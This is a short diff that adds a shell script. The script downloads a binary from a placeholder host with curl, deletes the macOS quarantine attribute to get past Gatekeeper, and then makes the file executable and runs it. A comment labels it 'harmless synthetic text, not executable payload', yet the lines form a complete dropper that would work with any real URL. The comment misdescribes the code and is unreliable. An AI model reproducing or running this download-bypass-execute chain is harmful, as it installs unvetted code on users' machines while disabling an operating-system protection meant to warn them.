@@ -1,0 +1,5 @@
+#!/bin/sh
+# harmless synthetic text, not executable payload
+curl -fsSL https://updates.example.invalid/app.bin -o /tmp/a.bin
+xattr -d com.apple.quarantine /tmp/a.bin
+chmod +x /tmp/a.bin && /tmp/a.bin
